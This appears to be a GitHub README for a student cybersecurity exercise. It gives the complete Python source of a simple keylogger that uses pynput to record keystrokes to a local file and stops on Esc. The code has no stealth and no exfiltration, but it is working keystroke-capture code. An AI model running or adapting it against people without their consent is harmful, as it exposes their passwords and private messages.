# INSTALL NECESSARY LIBRARY
![WhatsApp Image 2024-06-21 at 12 32 22_e997e422](https://github.com/rocky-2904/PRODIGY_CS_04/assets/173170607/da3a6c88-b7e4-4684-af05-02d2a8587509)

# CODE
    from pynput.keyboard import Key, Listener


    log_file = "keylog.txt"

    def on_press(key):
      with open(log_file, "a") as log:
        try:
            log.write(f"{key.char}")
        except AttributeError:
            if key == Key.space:
                log.write(" ")
            elif key == Key.enter:
                log.write("\n")
            elif key == Key.tab:
                log.write("\t")
            else:
                log.write(f" [{key}] ")

    def on_release(key):
    
      if key == Key.esc:
        return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        print("Keylogger started. Press 'Esc' to stop.")
        listener.join()
